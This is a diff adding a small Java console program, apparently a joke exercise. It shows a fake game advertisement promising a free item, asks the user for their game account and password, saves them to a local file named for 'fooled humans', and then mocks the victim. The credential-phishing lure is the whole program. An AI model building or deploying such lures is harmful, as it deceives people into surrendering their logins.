@@ -1,0 +1,51 @@
+
+import java.util.*;
+import java.io.*;
+
+public class KeyBoardRecorder {
+
+	public static void main(String[] args) throws IOException {
+		// TODO 自动生成的方法存根
+		System.out.println("贪玩蓝月，装备回收交易自由，原来装备真能换钱啊！");
+		System.out.println("登录即获得价值999rmb的屠龙宝刀!!!!");
+		System.out.println("登录（请输入贪玩蓝月账号名和密码,以分号分隔）");
+		for (;true;) {
+			Scanner sn = new Scanner(System.in);
+			String cac = sn.nextLine();
+			String[] countandcode = cac.split(";");
+			if (cac.isEmpty()) {
+				System.out.println("账户密码为空，请重新输入");
+			} else {
+				String count = countandcode[0];
+				String zhanghu = "用户名：";
+				String code = countandcode[1];
+				String mima = "密码:";
+				File file = new File("C:\\Users\\黎炜俊\\Desktop\\Java哈哈哈\\上当的人类的账号和密码.txt");
+        //这里的路径是作者的，请自定义你自己的路径.
+				FileOutputStream shuchu = new FileOutputStream(file, false);
+				try {
+					byte[] ZhangHu = zhanghu.getBytes();
+					byte[] Count = count.getBytes();
+					byte[] MiMa = mima.getBytes();
+					byte[] Code = code.getBytes();
+					shuchu.write(ZhangHu);
+					shuchu.write(Count);
+					shuchu.write(' ');
+					shuchu.write(MiMa);
+					shuchu.write(Code);
+					System.out.println("恭喜你，你的账号和密码已经被盗，我将清空你的装备XD");
+					System.out.println("还想要屠龙刀？我上次才给古天乐打掉一把，如今要报复社会");
+					System.out.println("啊哈哈哈啊哈哈");
+				} catch (IOException e) {
+					System.out.println(e.getMessage());
+				} finally {
+					shuchu.close();
+				}
+				break;
+			}
+
+		}
+
+	}
+
+}
